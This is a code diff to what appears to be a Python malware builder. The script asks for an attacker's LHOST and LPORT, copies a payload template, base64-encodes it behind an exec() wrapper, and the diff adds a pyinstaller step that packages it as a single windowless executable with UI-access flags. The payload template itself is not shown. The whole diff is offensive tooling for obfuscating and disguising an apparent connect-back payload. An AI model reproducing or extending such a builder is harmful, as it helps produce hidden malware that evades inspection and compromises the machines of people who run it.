@@ -14,6 +14,8 @@ BOLD = '\33[1m'
 
 #print(GREEN + BOLD + "\nThis isn't set up yet! Very soon... Please use the 'client.py' with the github instructions instead.\n" + END)
 
+print('                     ')
+
 host = input(GREEN + BOLD + 'Set LHOST IP: ' + END)
 port = input(GREEN + BOLD + 'Set LPORT: ' + END)
 name = input(GREEN + BOLD + 'Enter the basename for output files: ' + END)
@@ -21,8 +23,8 @@ name = input(GREEN + BOLD + 'Enter the basename for output files: ' + END)
 def createFile():
     try:
         global copiedFile
-        print(GREEN + BOLD + '\nCreating python file...')
-        time.sleep(1)
+        print(GREEN + BOLD + '\nCreating python file...\n')
+        time.sleep(2)
         exampleFile = os.getcwd() + '/source/example.py'
         copiedFile = os.getcwd() + '/output/' + name + '.py'
         copyfile(exampleFile, copiedFile)
@@ -44,29 +46,39 @@ def createFile():
         sys.exit()
 
 def encodedFile():
-    global copiedFile
-    print(GREEN + BOLD + 'Encoding file...')
-    time.sleep(1)
-    with open(copiedFile, 'rb') as file:
-        for line in file:
-            bencoded = base64.b64encode(file.read())
-            encoded = str(bencoded)
-    file.close()
-    with open(copiedFile, "w+") as file:
-        replaceEncoded = str("import base64,sys;exec(base64.b64decode(" + encoded + "))")
-        file.truncate(0)
-        file.write(replaceEncoded)
-    file.close()
+    try:
+        global copiedFile
+        print(GREEN + BOLD + '\nEncoding file...\n')
+        time.sleep(2)
+        with open(copiedFile, 'rb') as file:
+            for line in file:
+                bencoded = base64.b64encode(file.read())
+                encoded = str(bencoded)
+        file.close()
+        with open(copiedFile, "w+") as file:
+            replaceEncoded = str("import base64,sys;exec(base64.b64decode(" + encoded + "))")
+            file.truncate(0)
+            file.write(replaceEncoded)
+        file.close()
+    except:
+        print(RED + BOLD + "Couldn't create python file. Quitting...")
+        sys.exit()
 
 def pythonToExe():
-    subprocess.call(['python3', 'setup.py'])
+    p = subprocess.Popen(['pyinstaller', '--onefile', '--windowed', '--uac-uiaccess', copiedFile], cwd = 'output/')
+    p.wait()
 
 def done():
-    print(GREEN + BOLD + '\nDone! Saved to output folder')
+    time.sleep(2)
+    print(GREEN + BOLD + '\nDone! Saved to the dist directory in the output folder!')
+    time.sleep(2)
 
 def main():
     createFile()
     encodedFile()
+    pythonToExe()
+    done()
+
 
 if __name__ == "__main__":
     main()
